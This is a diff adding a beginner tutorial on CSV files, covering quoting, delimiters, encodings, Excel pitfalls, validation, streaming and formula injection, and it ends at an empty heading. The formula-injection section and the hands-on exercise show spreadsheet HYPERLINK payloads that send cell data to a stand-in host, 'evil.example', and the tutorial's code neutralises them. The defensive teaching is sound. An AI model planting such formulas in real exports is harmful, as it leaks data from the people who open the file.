@@ -1,0 +1,822 @@
+---
+title: "CSV"
+summary: "From zero: what CSV is and why every spreadsheet, bank, CRM and database export uses it, rows, columns and headers, why splitting on commas breaks real files, the quoting rules (RFC 4180) for commas, quotes and new lines inside fields, other delimiters and TSV, why everything is text and how Excel mangles IDs, phone numbers and dates, encodings, the BOM and line endings, reading and writing CSV safely in Python and JavaScript, converting CSV to and from JSON, validating uploads, handling big files, and CSV (formula) injection."
+level: beginner
+minutes: 35
+prerequisites: ["JSON"]
+tags: ["Data Formats"]
+---
+
+<Callout type="tip" title="In one minute">
+**CSV** (Comma-Separated Values) is the simplest table format: **one row per line**, values separated by **commas**, usually with a **header row** naming the columns. Every spreadsheet, database, bank and CRM can export and import it. It looks trivial, but real files have traps: a value that contains a comma, quote or new line must be **wrapped in double quotes**, and a quote inside is **doubled** (`"He said ""hi"""`), so **never parse CSV with `split(",")`**; use a real CSV library. CSV has **no types** (everything is text) and no single standard for delimiter (`,` `;` tab), encoding (UTF-8, with or without a **BOM**) or line endings. Excel silently changes IDs, phone numbers and dates. And a cell starting with `=` can run as a **formula** when opened in a spreadsheet (**CSV injection**), so sanitize exports.
+</Callout>
+
+## Start from zero
+
+<Callout type="analogy">
+Imagine dictating a **class register** over the phone: "Name comma Roll number comma City, new line, Ali comma 17 comma Lahore, new line…". The person on the other end writes it into a table. That works until someone's city is "Lahore, Punjab": now there's an extra comma and the columns slip. So you agree on a rule: "if a value contains a comma, I'll say **quote** before and after it". That's CSV: a very simple agreement, plus a few rules for the awkward cases. Everyone can do it, but only if both sides follow the same rules.
+</Callout>
+
+### Words you need first
+
+| Word | Simple meaning | Example |
+| --- | --- | --- |
+| **Record / row** | One line of data | `Ali,17,Lahore` |
+| **Field / cell** | One value in a row | `Lahore` |
+| **Column** | All values at the same position | the "City" column |
+| **Header row** | First row with column names | `name,roll,city` |
+| **Delimiter / separator** | The character between fields | `,` `;` tab |
+| **Quoting** | Wrapping a field in `"..."` so special characters are allowed | `"Lahore, Punjab"` |
+| **Escaping** | Writing a `"` inside a quoted field as `""` | `"6"" screen"` |
+| **Encoding** | How characters are stored as bytes | UTF-8 |
+| **BOM** | 3 invisible bytes at the start of some UTF-8 files | `EF BB BF` |
+| **TSV** | Same idea with **tab** as the delimiter | `name⇥city` |
+
+## What is it?
+
+A CSV file is plain text. Here is a small student list:
+
+```text
+name,roll_no,city,fee_paid
+Ali Raza,17,Lahore,true
+"Khan, Sara",22,"Lahore, Punjab",false
+Bilal,05,Karachi,true
+```
+
+As a table:
+
+| name | roll_no | city | fee_paid |
+| --- | --- | --- | --- |
+| Ali Raza | 17 | Lahore | true |
+| Khan, Sara | 22 | Lahore, Punjab | false |
+| Bilal | 05 | Karachi | true |
+
+The closest thing to a standard is **RFC 4180** (2005). It describes the common rules, but many programs differ slightly, which is why CSV is "simple" and still causes so many bugs.
+
+## Why does it matter?
+
+- **Universal exchange format:** bank statements, payment-gateway settlement reports, Shopify/WooCommerce orders, Google Analytics, HR and payroll exports, government data portals.
+- **Import features:** almost every business app needs "upload a CSV of products/customers/employees".
+- **Data and DevOps work:** loading data into databases (`COPY ... FROM ... CSV` in PostgreSQL), billing and cost exports from AWS/Azure/GCP, security scanner reports.
+- **Bugs are expensive:** a mis-parsed column can put money in the wrong account or shift every customer's phone number into the address field.
+- **Security:** user-supplied data exported to CSV can attack whoever opens it in Excel.
+
+## When and where do you use it?
+
+- **Use CSV** for flat tables of records: exports, imports, reports, data for spreadsheets.
+- **Don't use CSV** for nested data (orders with item lists) or when types matter. Use JSON (or JSON Lines), or Parquet for big analytics data.
+- You'll open CSV in Excel, Google Sheets or LibreOffice, in VS Code (the "Rainbow CSV" extension colours columns), and process it with Python, Node, SQL and command-line tools.
+
+## Concepts one by one
+
+### 1. Rows, columns and the header
+
+<Explain>
+<What>
+Each line is a **row**; commas split it into **fields**; the first row usually holds the **column names**.
+</What>
+<Why>
+With a header, programs can refer to columns by **name** (`row["city"]`) instead of position, so they keep working if columns are reordered.
+</Why>
+<When>
+Every CSV you produce should have a header, unless the receiving system explicitly forbids it.
+</When>
+<Where>
+Python's built-in `csv` module: `csv.reader` gives lists, `csv.DictReader` gives a dictionary per row using the header.
+</Where>
+<How>
+Every row should have the **same number of fields** as the header. A missing or extra field is a sign of a broken file.
+</How>
+</Explain>
+
+```bash
+cat > students.csv <<'EOF'
+name,roll_no,city,fee_paid
+Ali Raza,17,Lahore,true
+"Khan, Sara",22,"Lahore, Punjab",false
+Bilal,05,Karachi,true
+EOF
+python3 - <<'PY'
+import csv
+with open("students.csv", newline="", encoding="utf-8") as f:
+    reader = csv.DictReader(f)
+    print("columns:", reader.fieldnames)
+    for row in reader:
+        print(f"  {row['name']:11} | roll {row['roll_no']:>2} | {row['city']}")
+PY
+```
+
+```text output
+columns: ['name', 'roll_no', 'city', 'fee_paid']
+  Ali Raza    | roll 17 | Lahore
+  Khan, Sara  | roll 22 | Lahore, Punjab
+  Bilal       | roll 05 | Karachi
+```
+
+Line by line:
+
+- `open(..., newline="", encoding="utf-8")`: `newline=""` lets the csv module handle line endings itself (required for fields that contain new lines), and `encoding` says how to decode the bytes.
+- `csv.DictReader(f)` reads the header and then returns each row as a dictionary like `{"name": "Ali Raza", "roll_no": "17", ...}`.
+- `reader.fieldnames` is the list of column names from the header.
+- `"Khan, Sara"` and `"Lahore, Punjab"` come out correctly **with** their commas, because they were quoted.
+- `roll_no` for Bilal is still `05`: the csv module never converts types, so values stay exactly as text.
+
+### 2. Why `split(",")` breaks
+
+<Explain>
+<What>
+Splitting each line on commas ignores quoting, so any field containing a comma is cut into pieces and the columns shift.
+</What>
+<Why>
+Beginners (and quick shell one-liners) do this all the time, and it works on test data until a real address, company name or product description arrives.
+</Why>
+<When>
+Any time data can contain commas: names ("Khan, Sara"), addresses, amounts formatted as `1,500`, free-text notes.
+</When>
+<Where>
+`line.split(",")` in Python, `str.split(",")` in JavaScript, `cut -d,` and `awk -F,` in the shell: all naive.
+</Where>
+<How>
+Always use a CSV parser: Python `csv`, Node `csv-parse` or Papa Parse, PostgreSQL `COPY ... CSV`, or tools like csvkit, `mlr` (Miller) or DuckDB on the command line.
+</How>
+</Explain>
+
+```bash
+echo "--- naive: cut -d, -f3 (the city column):"
+cut -d, -f3 students.csv
+echo "--- naive Python split:"
+python3 -c '
+for line in open("students.csv"):
+    parts = line.rstrip("\n").split(",")
+    print(f"  {len(parts)} fields: {parts}")' | sed -n 3p
+echo "--- real CSV parser:"
+python3 -c '
+import csv
+for row in csv.reader(open("students.csv", newline="")):
+    print(f"  {len(row)} fields, city = {row[2]!r}")' | sed -n 3p
+```
+
+```text output
+--- naive: cut -d, -f3 (the city column):
+city
+Lahore
+22
+Karachi
+--- naive Python split:
+  6 fields: ['"Khan', ' Sara"', '22', '"Lahore', ' Punjab"', 'false']
+--- real CSV parser:
+  4 fields, city = 'Lahore, Punjab'
+```
+
+Line by line:
+
+- `cut -d, -f3` takes the "third field" by splitting on every comma. For Sara's row it prints `22`, her roll number, as her **city**.
+- The naive Python split turns Sara's row into **6** fields: the quotes stay as characters and her name and city are each cut in two.
+- `csv.reader` understands the quotes, so the row has exactly 4 fields, the same as the header, and `row[2]` is the full city.
+- `sed -n 3p` just prints the third line of each Python output (Sara's row), to keep the comparison short.
+
+### 3. Quoting rules: commas, quotes and new lines inside fields
+
+<Explain>
+<What>
+RFC 4180's rules: a field that contains the **delimiter**, a **double quote** or a **line break** must be enclosed in double quotes, and a double quote inside such a field is written **twice** (`""`).
+</What>
+<Why>
+That's the only way a reader can tell "comma inside a value" from "comma between values".
+</Why>
+<When>
+Product descriptions (`55" TV`), addresses, notes, anything typed by humans.
+</When>
+<Where>
+Writers do this automatically: Python `csv.writer`, Node `csv-stringify`, Excel's "Save as CSV", PostgreSQL `COPY ... TO ... CSV`.
+</Where>
+<How>
+**Never write CSV by joining strings with commas.** Use a writer, exactly as with JSON and XML.
+</How>
+</Explain>
+
+```bash
+python3 - <<'PY'
+import csv, sys
+rows = [
+    ["sku", "description", "price"],
+    ["TV-55", '55" 4K TV, smart', "89999"],
+    ["MUG-01", "Mug\nwith handle", "800"],
+    ["CAP-02", "Plain cap", "450"],
+]
+with open("products.csv", "w", newline="", encoding="utf-8") as f:
+    csv.writer(f).writerows(rows)
+print(open("products.csv", encoding="utf-8").read(), end="")
+print("--- read back:")
+for row in csv.reader(open("products.csv", newline="", encoding="utf-8")):
+    print(" ", row)
+PY
+```
+
+```text output
+sku,description,price
+TV-55,"55"" 4K TV, smart",89999
+MUG-01,"Mug
+with handle",800
+CAP-02,Plain cap,450
+--- read back:
+  ['sku', 'description', 'price']
+  ['TV-55', '55" 4K TV, smart', '89999']
+  ['MUG-01', 'Mug\nwith handle', '800']
+  ['CAP-02', 'Plain cap', '450']
+```
+
+Line by line:
+
+- `csv.writer(f).writerows(rows)` writes all rows with correct quoting.
+- `55" 4K TV, smart` contains a quote **and** a comma, so it's written as `"55"" 4K TV, smart"`: wrapped in quotes, with the inner quote doubled.
+- `Mug\nwith handle` contains a line break, so it's quoted and the file has a record that spans **two physical lines**. That's why "one line = one row" isn't always true, and why `wc -l` doesn't count rows reliably.
+- `Plain cap` needs no quotes, so the writer leaves it alone (the default, minimal quoting).
+- Reading the file back with `csv.reader` gives exactly the original values: a perfect round trip.
+
+### 4. Other delimiters: semicolons, tabs and pipes
+
+<Explain>
+<What>
+"CSV" files don't always use commas. **Semicolons** are common in countries where the comma is the decimal separator (Excel in Germany, France, Turkey…). **TSV** uses tabs. Some systems use `|`.
+</What>
+<Why>
+If you guess the wrong delimiter, every row becomes one big field.
+</Why>
+<When>
+Files from banks, European suppliers, or Excel on a computer with non-English regional settings.
+</When>
+<Where>
+Python: `csv.reader(f, delimiter=";")`, or `csv.Sniffer()` to guess. Excel can be told with a first line `sep=;`.
+</Where>
+<How>
+TSV is often the safest choice for exports, because tabs rarely appear inside real data.
+</How>
+</Explain>
+
+```bash
+printf 'name;city;amount\nAli Raza;Lahore;1.500,50\nSara Khan;Karachi;250,00\n' > bank-export.csv
+python3 - <<'PY'
+import csv
+sample = open("bank-export.csv", encoding="utf-8").read(1024)
+dialect = csv.Sniffer().sniff(sample)
+print("guessed delimiter:", repr(dialect.delimiter))
+with open("bank-export.csv", newline="", encoding="utf-8") as f:
+    for row in csv.DictReader(f, delimiter=";"):
+        amount = float(row["amount"].replace(".", "").replace(",", "."))
+        print(f"  {row['name']:10} {amount:>9.2f}")
+PY
+printf 'name\tcity\nAli Raza\tLahore\n' | python3 -c 'import csv, sys; print("TSV row:", list(csv.reader(sys.stdin, delimiter="\t"))[1])'
+```
+
+```text output
+guessed delimiter: ';'
+  Ali Raza     1500.50
+  Sara Khan     250.00
+TSV row: ['Ali Raza', 'Lahore']
+```
+
+Line by line:
+
+- The bank file uses `;` between fields and the European number format `1.500,50` (dot for thousands, comma for decimals).
+- `csv.Sniffer().sniff(sample)` looks at the first 1 KB and guesses the delimiter: `;`. It's a guess, so for known sources, set the delimiter explicitly.
+- `DictReader(f, delimiter=";")` splits correctly.
+- To turn `1.500,50` into a number: remove the thousands dots, then replace the decimal comma with a dot, giving `1500.50`.
+- The last line reads a TSV row by passing `delimiter="\t"`.
+
+### 5. Everything is text: types, leading zeros and Excel
+
+<Explain>
+<What>
+CSV has **no types**: `05`, `true`, `2026-11-10` and `1500` are all just characters. The program reading the file decides what they mean, and spreadsheets decide **automatically**.
+</What>
+<Why>
+Automatic guessing destroys data: Excel removes leading zeros, turns long numbers into `1.23E+15`, converts `1-2` or `MARCH1` into dates, and has famously renamed human genes such as `SEPT2` and `MARCH1` in scientific spreadsheets.
+</Why>
+<When>
+IDs, CNIC and phone numbers, ZIP codes, account and card numbers, product codes, dates.
+</When>
+<Where>
+In code, convert columns **deliberately**. In Excel, import with **Data → From Text/CSV** and set those columns to **Text** instead of double-clicking the file.
+</Where>
+<How>
+Document each column's type and format in the import specification (e.g. "date: YYYY-MM-DD, amount: decimal with dot, phone: text").
+</How>
+</Explain>
+
+```bash
+cat > customers.csv <<'EOF'
+customer_id,phone,cnic,joined,balance
+00042,03001234567,3520212345671,2026-01-15,1500.75
+00107,03219876543,4210198765432,2026-03-02,-200.00
+EOF
+python3 - <<'PY'
+import csv
+from datetime import date
+from decimal import Decimal
+with open("customers.csv", newline="", encoding="utf-8") as f:
+    for row in csv.DictReader(f):
+        customer = {
+            "customer_id": row["customer_id"],                 # keep as text: leading zeros matter
+            "phone": row["phone"],                             # text: never do maths on phone numbers
+            "joined": date.fromisoformat(row["joined"]),       # real date
+            "balance": Decimal(row["balance"]),                # exact decimal for money
+        }
+        print(customer["customer_id"], customer["phone"], customer["joined"].strftime("%d %b %Y"), customer["balance"] + Decimal("0.25"))
+print("what a spreadsheet would show for the ID and phone if guessed as numbers:", int("00042"), int("03001234567"))
+PY
+```
+
+```text output
+00042 03001234567 15 Jan 2026 1501.00
+00107 03219876543 02 Mar 2026 -199.75
+what a spreadsheet would show for the ID and phone if guessed as numbers: 42 3001234567
+```
+
+Line by line:
+
+- `customer_id`, `phone` and `cnic` are kept as **strings**, so `00042` and the leading `0` of the phone number survive.
+- `date.fromisoformat` turns `2026-01-15` into a real date, which we can format any way (`15 Jan 2026`).
+- `Decimal` keeps money exact: `1500.75 + 0.25 = 1501.00`, with no floating-point surprises.
+- The last line shows what happens if the same text is treated as numbers, which is exactly what Excel does on double-click: the ID becomes `42` and the phone loses its leading zero. If someone then **saves** the file, the original values are gone for good.
+
+### 6. Encoding and the BOM
+
+<Explain>
+<What>
+A CSV file is bytes; the **encoding** says which characters they represent. Use **UTF-8**. Excel often adds a **BOM** (byte order mark): the 3 bytes `EF BB BF` at the very start, which mark the file as UTF-8.
+</What>
+<Why>
+Without the BOM, older Excel versions open UTF-8 files as a Western encoding, so Urdu, Arabic or accented names turn into garbage like `Ø´Ú©Ø±ÛŒÛ`. **With** the BOM, programs that don't expect it read the first column name as `\ufeffname`, and `row["name"]` fails.
+</Why>
+<When>
+Exchanging CSVs with Excel users, or any file with non-English text.
+</When>
+<Where>
+Python: read with `encoding="utf-8-sig"` (removes a BOM if present, works without one too); write with `utf-8-sig` if the file is meant for Excel.
+</Where>
+<How>
+Check the first bytes with `head -c 3 file.csv | od -An -tx1`, or `file file.csv`.
+</How>
+</Explain>
+
+```bash
+printf '\xef\xbb\xbfname,city\nAli,لاہور\n' > from-excel.csv
+head -c 3 from-excel.csv | od -An -tx1
+python3 - <<'PY'
+import csv
+plain = csv.DictReader(open("from-excel.csv", encoding="utf-8", newline=""))
+print("utf-8     header:", plain.fieldnames)
+row = next(plain)
+print("row['name'] works?", "name" in row)
+sig = csv.DictReader(open("from-excel.csv", encoding="utf-8-sig", newline=""))
+row = next(sig)
+print("utf-8-sig header:", sig.fieldnames, "->", row["name"], row["city"])
+PY
+```
+
+```text output
+ ef bb bf
+utf-8     header: ['\ufeffname', 'city']
+row['name'] works? False
+utf-8-sig header: ['name', 'city'] -> Ali لاہور
+```
+
+Line by line:
+
+- `printf '\xef\xbb\xbf...'` creates a file the way Excel's "CSV UTF-8" option does, with the BOM at the start. The city is written in Urdu.
+- `od -An -tx1` shows the first three bytes in hex: `ef bb bf`.
+- Reading with plain `utf-8` keeps the BOM as an invisible character `\ufeff` glued to the first column name, so `row["name"]` doesn't exist. This bug can take hours to find, because the header **looks** correct when printed.
+- `utf-8-sig` strips the BOM, the column is called `name` again, and the Urdu text reads correctly.
+
+### 7. Line endings
+
+<Explain>
+<What>
+RFC 4180 says each record ends with **CRLF** (`\r\n`, the Windows style). Unix tools usually write **LF** (`\n`).
+</What>
+<Why>
+Mixed or unexpected line endings cause stray `\r` characters at the end of the last field (`"Lahore\r"`), which break comparisons like `city == "Lahore"`.
+</Why>
+<When>
+Files created on Windows and processed on Linux, or the other way round.
+</When>
+<Where>
+Python's csv writer uses `\r\n` by default (`lineterminator="\n"` changes it). Always open CSV files with `newline=""` in Python so the module handles both.
+</Where>
+<How>
+Shell tools like `awk` and `cut` don't remove `\r`. Clean with `tr -d '\r'` or `dos2unix` if needed.
+</How>
+</Explain>
+
+```bash
+python3 -c 'import csv; csv.writer(open("crlf.csv", "w", newline="")).writerow(["Ali", "Lahore"])'
+od -c crlf.csv | head -1
+printf 'name,city\r\nAli,Lahore\r\n' > windows.csv
+awk -F, 'NR==2 { print "awk sees city == Lahore? " ($2 == "Lahore" ? "yes" : "no (it is Lahore\\r)") }' windows.csv
+tr -d '\r' < windows.csv | awk -F, 'NR==2 { print "after tr -d: " ($2 == "Lahore" ? "yes" : "no") }'
+```
+
+```text output
+0000000   A   l   i   ,   L   a   h   o   r   e  \r  \n
+awk sees city == Lahore? no (it is Lahore\r)
+after tr -d: yes
+```
+
+Line by line:
+
+- Python's csv writer ends the row with `\r\n`; `od -c` shows each byte as a character.
+- `windows.csv` has Windows line endings. `awk` splits on commas, but the last field is `Lahore\r`, so the comparison fails.
+- `tr -d '\r'` deletes carriage returns before `awk` reads the data, and the comparison works.
+
+### 8. CSV ⇄ JSON
+
+<Explain>
+<What>
+Each CSV row maps naturally to a JSON **object** (header names as keys), and the whole file to an **array** of objects.
+</What>
+<Why>
+APIs and front ends want JSON; spreadsheets and finance teams want CSV.
+</Why>
+<When>
+"Export to Excel" buttons, importing a CSV into a REST API, feeding data to `jq`.
+</When>
+<Where>
+Python: `DictReader` + `json.dump` and `json.load` + `DictWriter`. JavaScript: Papa Parse (browser and Node) or `csv-parse`/`csv-stringify` in Node.
+</Where>
+<How>
+Going JSON → CSV, nested data must be **flattened** (e.g. `address.city` becomes a column), and lists either joined into one cell or exploded into several rows.
+</How>
+</Explain>
+
+```bash
+python3 - <<'PY'
+import csv, json
+with open("students.csv", newline="", encoding="utf-8") as f:
+    students = [
+        {**row, "roll_no": int(row["roll_no"]), "fee_paid": row["fee_paid"] == "true"}
+        for row in csv.DictReader(f)
+    ]
+print(json.dumps(students[1]))
+
+orders = [
+    {"id": 1, "customer": {"name": "Ali", "city": "Lahore"}, "items": ["MUG-01", "CAP-02"]},
+    {"id": 2, "customer": {"name": "Sara", "city": "Karachi"}, "items": ["TV-55"]},
+]
+with open("orders.csv", "w", newline="", encoding="utf-8") as f:
+    writer = csv.DictWriter(f, fieldnames=["id", "customer_name", "customer_city", "items"], lineterminator="\n")
+    writer.writeheader()
+    for o in orders:
+        writer.writerow({"id": o["id"], "customer_name": o["customer"]["name"],
+                         "customer_city": o["customer"]["city"], "items": "|".join(o["items"])})
+print(open("orders.csv").read(), end="")
+PY
+```
+
+```text output
+{"name": "Khan, Sara", "roll_no": 22, "city": "Lahore, Punjab", "fee_paid": false}
+id,customer_name,customer_city,items
+1,Ali,Lahore,MUG-01|CAP-02
+2,Sara,Karachi,TV-55
+```
+
+Line by line:
+
+- **CSV → JSON:** each row from `DictReader` becomes a dictionary. `{**row, ...}` copies it and overrides two keys with converted types: `roll_no` as an integer and `fee_paid` as a real boolean. Converting types at this boundary is your job, because CSV can't do it.
+- `json.dumps` of Sara's row shows proper JSON types: a number and `false`.
+- **JSON → CSV:** `DictWriter` needs the list of columns (`fieldnames`). The nested `customer` object is flattened into `customer_name` and `customer_city`, and the `items` list is joined into one cell with `|`.
+- `lineterminator="\n"` writes Unix line endings, and `writeheader()` writes the column names first.
+
+### 9. Validating uploaded CSV files
+
+<Explain>
+<What>
+Check an uploaded CSV **before** importing anything: required columns, correct field count, types and formats, allowed values, and duplicates. Report problems **with row numbers**.
+</What>
+<Why>
+Users upload whatever their spreadsheet exported. Importing half a file and failing on row 812 leaves your database in a messy state.
+</Why>
+<When>
+Every "import from CSV" feature: products, employees, bulk payments, price lists.
+</When>
+<Where>
+Validate all rows first, and only import when there are **zero** errors (or show the user a downloadable error report). Wrap the import in a database transaction.
+</Where>
+<How>
+Row numbers should match what the user sees in Excel: header = row 1, first data row = row 2.
+</How>
+</Explain>
+
+```bash
+cat > upload.csv <<'EOF'
+sku,name,price,stock
+MUG-01,Coffee mug,800,25
+CAP-02,Cap,abc,10
+,Water bottle,1200,5
+MUG-01,Coffee mug (dup),800,3
+TV-55,"55"" TV",89999
+EOF
+python3 - <<'PY'
+import csv
+REQUIRED = ["sku", "name", "price", "stock"]
+errors, seen = [], set()
+with open("upload.csv", newline="", encoding="utf-8-sig") as f:
+    reader = csv.reader(f)
+    header = next(reader)
+    missing = [c for c in REQUIRED if c not in header]
+    if missing:
+        raise SystemExit(f"missing columns: {missing}")
+    for line_no, fields in enumerate(reader, start=2):
+        if len(fields) != len(header):
+            errors.append(f"row {line_no}: expected {len(header)} fields, got {len(fields)}")
+            continue
+        row = dict(zip(header, fields))
+        if not row["sku"]:
+            errors.append(f"row {line_no}: sku is empty")
+        elif row["sku"] in seen:
+            errors.append(f"row {line_no}: duplicate sku {row['sku']}")
+        seen.add(row["sku"])
+        if not row["price"].isdigit():
+            errors.append(f"row {line_no}: price {row['price']!r} is not a whole number")
+print("\n".join(errors) if errors else "file OK")
+print(f"{len(errors)} problem(s): nothing imported" if errors else "importing...")
+PY
+```
+
+```text output
+row 3: price 'abc' is not a whole number
+row 4: sku is empty
+row 5: duplicate sku MUG-01
+row 6: expected 4 fields, got 3
+4 problem(s): nothing imported
+```
+
+Line by line:
+
+- `utf-8-sig` accepts files with or without Excel's BOM.
+- The header is checked for all required columns before anything else.
+- `enumerate(reader, start=2)` numbers data rows from 2, matching Excel's row numbers.
+- Each row is checked: correct number of fields, non-empty and unique `sku`, and a whole-number `price`.
+- All errors are collected and shown together, so the user can fix the whole file in one go, and nothing is imported while any error exists.
+
+### 10. Big files: stream, don't load everything
+
+<Explain>
+<What>
+CSV exports can be huge: millions of rows, gigabytes. **Streaming** means reading one row at a time, updating totals, and never holding the whole file in memory.
+</What>
+<Why>
+`list(csv.reader(f))`, `f.read()` or opening a 2 GB file in Excel (limit: 1,048,576 rows) can run out of memory or simply fail.
+</Why>
+<When>
+Logs, transaction histories, analytics exports, cloud billing files.
+</When>
+<Where>
+Python's `csv.reader` is already a stream: a `for` loop reads row by row. For analysis, **pandas** (`read_csv(..., chunksize=100_000)`), **DuckDB** and **Polars** process large CSVs very fast; PostgreSQL's `COPY` loads them into a database.
+</Where>
+<How>
+Aggregate as you go (counts, sums, groups), or convert big CSVs to a columnar format like **Parquet** for repeated analysis.
+</How>
+</Explain>
+
+```bash
+python3 - <<'PY'
+import csv, random
+random.seed(42)
+cities = ["Lahore", "Karachi", "Islamabad", "Peshawar", "Quetta"]
+with open("sales.csv", "w", newline="") as f:
+    w = csv.writer(f, lineterminator="\n")
+    w.writerow(["order_id", "city", "amount"])
+    for i in range(1, 200_001):
+        w.writerow([i, random.choice(cities), random.randint(100, 5000)])
+PY
+echo "file size: $(wc -c < sales.csv) bytes, lines: $(wc -l < sales.csv)"
+python3 - <<'PY'
+import csv
+from collections import Counter
+totals, count = Counter(), 0
+with open("sales.csv", newline="") as f:
+    for row in csv.DictReader(f):
+        totals[row["city"]] += int(row["amount"])
+        count += 1
+print(f"{count:,} orders streamed")
+for city, total in totals.most_common():
+    print(f"  {city:10} Rs {total:,}")
+PY
+```
+
+```text output
+file size: 3891679 bytes, lines: 200001
+200,000 orders streamed
+  Karachi    Rs 102,139,971
+  Quetta     Rs 101,988,984
+  Lahore     Rs 101,908,964
+  Peshawar   Rs 101,851,626
+  Islamabad  Rs 101,626,289
+```
+
+Line by line:
+
+- The first script generates a realistic test file: 200,000 orders with a random city and amount. `random.seed(42)` makes the "random" data identical every run, so the results can be checked.
+- `wc -c` and `wc -l` show the file is about 3.9 MB with 200,001 lines (header + 200,000 rows).
+- The second script reads **one row at a time** in the `for` loop. Only the running totals (`Counter`) stay in memory, so the same code works for a 20 GB file.
+- `totals.most_common()` lists cities from the highest total to the lowest.
+
+### 11. CSV injection (formula injection)
+
+<Explain>
+<What>
+Spreadsheet programs treat a cell that starts with `=`, `+`, `-` or `@` (and sometimes tab or carriage return) as a **formula**. If your app exports user-controlled text into a CSV, an attacker can store a value like `=HYPERLINK("http://evil.example/?leak="&A2, "Click for invoice")`, which runs when an admin opens the export in Excel.
+</What>
+<Why>
+Formulas can build links that send other cells' data (emails, phone numbers, salaries) to the attacker, show fake warnings, or, on old or misconfigured systems, start other programs (DDE attacks).
+</Why>
+<When>
+Any export containing text that users typed: names, addresses, comments, support tickets, survey answers.
+</When>
+<Where>
+OWASP's "CSV Injection" guidance: prefix risky cells with a single quote `'`, which spreadsheets display as text. Don't change real numeric columns: a genuine `-500` amount should be written as a number, not text.
+</Where>
+<How>
+Sanitize **text fields** at export time, and also validate input (does a name really need to start with `=`?).
+</How>
+</Explain>
+
+```bash
+python3 - <<'PY'
+import csv, re
+NUMBER = re.compile(r"-?\d+(\.\d+)?")
+
+def safe_cell(value):
+    text = str(value)
+    if NUMBER.fullmatch(text):
+        return text                           # a real number: leave it alone
+    if text[:1] in ("=", "+", "-", "@", "\t", "\r"):
+        return "'" + text                     # would start a formula: force text
+    return text
+
+customers = [
+    ["name", "phone", "balance", "note"],
+    ["Ali Raza", "+92 300 1234567", -500, "VIP"],
+    ['=HYPERLINK("http://evil.example/?d="&B3,"Click for invoice")', "0300 1111111", 1200, "@SUM(1+1)"],
+]
+with open("export.csv", "w", newline="", encoding="utf-8") as f:
+    w = csv.writer(f, lineterminator="\n")
+    for row in customers:
+        w.writerow([safe_cell(v) for v in row])
+print(open("export.csv").read(), end="")
+PY
+```
+
+```text output
+name,phone,balance,note
+Ali Raza,'+92 300 1234567,-500,VIP
+"'=HYPERLINK(""http://evil.example/?d=""&B3,""Click for invoice"")",0300 1111111,1200,'@SUM(1+1)
+```
+
+Line by line:
+
+- `NUMBER` matches plain numbers like `-500` or `1200.50`. Those are written unchanged, so spreadsheets still treat them as numbers.
+- Any other value starting with `=`, `+`, `-`, `@`, tab or carriage return gets a leading `'`.
+- The phone number `+92 300 1234567` becomes `'+92 300 1234567`. Excel shows it as text, and as a bonus it doesn't try to calculate it.
+- The attacker's `=HYPERLINK(...)` name becomes `'=HYPERLINK(...)`: displayed as harmless text instead of a clickable data-stealing link. The csv writer also quotes it and doubles its inner quotes.
+- `-500` stays a number because it matches `NUMBER`.
+
+## Hands-on
+
+Clean a messy bank statement exported from Excel: BOM, semicolons, `dd/mm/yyyy` dates, European number format, quotes inside fields, and a malicious description. Produce a clean, safe CSV and check that the balances add up.
+
+```bash
+printf '\xef\xbb\xbfDate;Description;Debit;Credit;Balance\n01/11/2026;Opening balance;;;50.000,00\n03/11/2026;"Salary; November";;185.000,00;235.000,00\n05/11/2026;=HYPERLINK("http://evil.example");2.500,00;;232.500,00\n07/11/2026;K-Electric bill;12.340,50;;220.159,50\n09/11/2026;"Transfer to ""Ali""";20.000,00;;200.159,50\n' > statement.csv
+python3 - <<'PY'
+import csv
+from datetime import datetime
+from decimal import Decimal
+
+def money(text):
+    return Decimal(text.replace(".", "").replace(",", ".")) if text else Decimal("0")
+
+def safe_text(value):
+    return "'" + value if value[:1] in ("=", "+", "-", "@", "\t", "\r") else value
+
+rows = []
+with open("statement.csv", newline="", encoding="utf-8-sig") as f:
+    for r in csv.DictReader(f, delimiter=";"):
+        rows.append({
+            "date": datetime.strptime(r["Date"], "%d/%m/%Y").date().isoformat(),
+            "description": safe_text(r["Description"]),
+            "amount": money(r["Credit"]) - money(r["Debit"]),
+            "balance": money(r["Balance"]),
+        })
+
+with open("statement-clean.csv", "w", newline="", encoding="utf-8") as f:
+    w = csv.DictWriter(f, fieldnames=["date", "description", "amount", "balance"], lineterminator="\n")
+    w.writeheader()
+    w.writerows(rows)
+print(open("statement-clean.csv").read(), end="")
+
+income = sum(r["amount"] for r in rows if r["amount"] > 0)
+spent = -sum(r["amount"] for r in rows if r["amount"] < 0)
+opening = rows[0]["balance"]
+ok = opening + income - spent == rows[-1]["balance"]
+print(f"income {income:,.2f} | spent {spent:,.2f} | balance check: {'OK' if ok else 'MISMATCH'}")
+PY
+```
+
+```text output
+date,description,amount,balance
+2026-11-01,Opening balance,0,50000.00
+2026-11-03,Salary; November,185000.00,235000.00
+2026-11-05,"'=HYPERLINK(""http://evil.example"")",-2500.00,232500.00
+2026-11-07,K-Electric bill,-12340.50,220159.50
+2026-11-09,"Transfer to ""Ali""",-20000.00,200159.50
+income 185,000.00 | spent 34,840.50 | balance check: OK
+```
+
+Line by line:
+
+- `printf` creates the kind of file a bank or Excel produces: a BOM, `;` as the delimiter, `dd/mm/yyyy` dates, `50.000,00` amounts, a description containing `;` (so it's quoted), one with doubled quotes, and one malicious formula.
+- `encoding="utf-8-sig"` removes the BOM, and `delimiter=";"` splits the fields correctly. `"Salary; November"` stays one field.
+- `datetime.strptime(..., "%d/%m/%Y")` reads the Pakistani/European date order, and `.isoformat()` writes the unambiguous `2026-11-03`. (Is `03/11/2026` 3 November or 11 March? ISO dates avoid that question.)
+- `money()` converts `185.000,00` to the exact `Decimal('185000.00')`, and empty debit/credit cells become 0.
+- Each row gets one signed `amount`: credit minus debit.
+- The output uses commas, ISO dates and dot decimals, and the formula is neutralised with `'`. The csv writer re-quotes fields that need it.
+- The final check confirms opening balance + income − spending = closing balance. If parsing had gone wrong anywhere, this check would say MISMATCH.
+
+## Real-world example
+
+A small e-commerce company exports orders to CSV every night for its accountant. One week the accountant's totals don't match the payment gateway. The cause: a customer typed the delivery address `House 12, Street 4, DHA` and the export script built lines with `",".join(values)`, so every address with commas shifted the following columns, and some **amounts** landed in the "city" column. The developer switched to `csv.writer`, added a test with commas, quotes and new lines in every text field, started writing amounts as plain numbers and dates as `YYYY-MM-DD`, and added the formula-injection sanitizer after a security review found a customer named `=HYPERLINK(...)`. The import side was fixed too: the accountant now uses **Data → From Text/CSV** with the phone and order-ID columns set to Text, so leading zeros stop disappearing.
+
+## Common mistakes
+
